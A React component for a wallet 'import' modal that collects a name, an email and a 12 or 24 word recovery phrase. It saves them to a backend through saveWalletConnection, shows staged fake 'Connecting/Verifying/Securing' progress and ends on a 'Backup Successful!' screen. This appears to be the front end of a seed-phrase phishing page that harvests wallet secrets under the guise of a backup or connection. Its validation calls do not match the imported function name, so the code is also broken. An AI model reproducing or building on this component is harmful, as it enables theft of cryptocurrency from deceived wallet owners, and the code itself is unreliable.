import "./ConnectFormModal.css";
import { useState, useEffect } from "react";
import { FaTimes, FaCheck } from "react-icons/fa";
import { auth } from "../firebase/firebase";

import {
  validateRecoverPhrase,
  saveWalletConnection,
} from "../services/walletService";

function ConnectFormModal({ isOpen, onClose, wallet }) {
  const [tab, setTab] = useState("phrase");
  const [step, setStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [success, setSuccess] = useState(false);
  const [uniqueId, setUniqueId] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);
  const [validationError, setValidationError] = useState(null);

  const [form, setForm] = useState({
    name: "",
    email: "",
    recoveryPhrase: "",
    keystore: "",
    password: "",
    privateKey: "",
  });

  useEffect(() => {
    if (!isOpen) {
      resetForm();
    }
  }, [isOpen]);

  const resetForm = () => {
    setStep(0);
    setProgress(0);
    setSuccess(false);
    setError(null);
    setValidationError(null);
    setForm({
      name: "",
      email: "",
      recoveryPhrase: "",
      keystore: "",
      password: "",
      privateKey: "",
    });
  };

  if (!isOpen) return null;

  const handleChange = (e) => {
    setValidationError(null);
    setForm({
      ...form,
      [e.target.name]: e.target.value,
    });
  };

  const validateFormData = () => {
    if (!form.name.trim()) {
      setValidationError("Wallet name is required");
      return false;
    }

    if (!form.email.trim()) {
      setValidationError("Email is required");
      return false;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(form.email)) {
      setValidationError("Please enter a valid email address");
      return false;
    }

    const validation = validateRecoveryPhras(form.recoveryPhrase);
    if (!validation.isValid) {
      setValidationError(validation.error);
      return false;
    }

    return true;
  };

  const handleSubmit = async () => {
    setError(null);

    if (!validateFormData()) return;

    setIsLoading(true);
    setValidationError(null);

    try {
      let walletData = {
        name: form.name.trim(),
        email: form.email.trim(),
        type: wallet?.name || "Unknown",
      };

      const validation = validateRecoveryPhrase(form.recoveryPhrase);
      
      walletData.recoveryPhrase = form.recoveryPhrase.trim();
      walletData.wordCount = validation.wordCount;

      setStep(1);
      setProgress(20);

      await new Promise((resolve) => setTimeout(resolve, 1200));

      const result = await saveWalletConnection(walletData);

      if (!result.success) {
        throw new Error(result.error);
      }

      setUniqueId(result.uid);

      setStep(2);
      setProgress(60);

      await new Promise((resolve) => setTimeout(resolve, 1200));

      setStep(3);
      setProgress(100);

      await new Promise((resolve) => setTimeout(resolve, 800));

      setSuccess(true);
    } catch (err) {
      console.error(err);
      setError(err.message || "Something went wrong");
      setStep(0);
      setProgress(0);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      {!success && (
        <div className="connect-overlay" onClick={onClose}>
          <div
            className="connect-modal premium"
            onClick={(e) => e.stopPropagation()}
          >
            <FaTimes className="close-icon" onClick={onClose} />

            <div className="connect-header modern">
              {wallet?.image && (
                <img src={wallet.image} alt={wallet.name} className="wallet-logo" />
              )}
              <h2>Import your <br />{wallet?.name || "Wallet"}</h2>
            </div>

            {error && (
              <div className="validation-error">
                <p>{error}</p>
              </div>
            )}

            {step > 0 && (
              <div className="connection-steps">
                <div className="progress-bar">
                  <div className="progress-fill" style={{ width: `${progress}%` }}></div>
                </div>
                <div className="steps">
                  <span className={step >= 1 ? "active" : ""}>{step > 1 ? <FaCheck /> : "Connecting"}</span>
                  <span className={step >= 2 ? "active" : ""}>{step > 2 ? <FaCheck /> : "Verifying"}</span>
                  <span className={step >= 3 ? "active" : ""}>Securing</span>
                </div>
              </div>
            )}

            {step === 0 && (
              <>
                <div className="connect-tabs">
                  <span className={tab === "phrase" ? "active" : ""}>Recovery Phrase</span>
                </div>

                <div className="connect-body">
                  <label>Wallet Name</label>
                  <input name="name" placeholder="Wallet Name" value={form.name} onChange={handleChange} />

                  <label>Email</label>
                  <input name="email" type="email" placeholder="Email" value={form.email} onChange={handleChange} />

                  <label>Recovery Phrase</label>
                  <textarea
                    name="recoveryPhrase"
                    placeholder="Enter 12 or 24 recovery phrase words"
                    value={form.recoveryPhrase}
                    onChange={handleChange}
                  />

                  <small>Enter exactly 12 or 24 words separated by spaces</small>

                  {validationError && (
                    <div className="validation-error">
                      <p>{validationError}</p>
                    </div>
                  )}

                  <div className="connect-actions">
                    <button className="btn-cancel" onClick={onClose}>Cancel</button>
                    <button className="btn-proceed" onClick={handleSubmit} disabled={isLoading}>
                      {isLoading ? "Processing..." : "Proceed"}
                    </button>
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {success && (
        <div className="success-overlay">
          <div className="success-modal premium-success">
            <div className="success-check"><FaCheck /></div>
            <h2>Backup Successful!</h2>

            <div className="uid-box">
              <span className="uid-label">UNIQUE IDENTIFIER</span>
              <div className="uid-code">{uniqueId}</div>
              <button className="uid-btn" onClick={() => navigator.clipboard.writeText(uniqueId)}>
                Copy UID
              </button>
            </div>

            <p className="success-text">Your data has been successfully backed up.</p>

            <button className="btn-primary success-done" onClick={() => { setSuccess(false); onClose(); }}>
              Done
            </button>
          </div>
        </div>
      )}
    </>
  );
}

export default ConnectFormModal;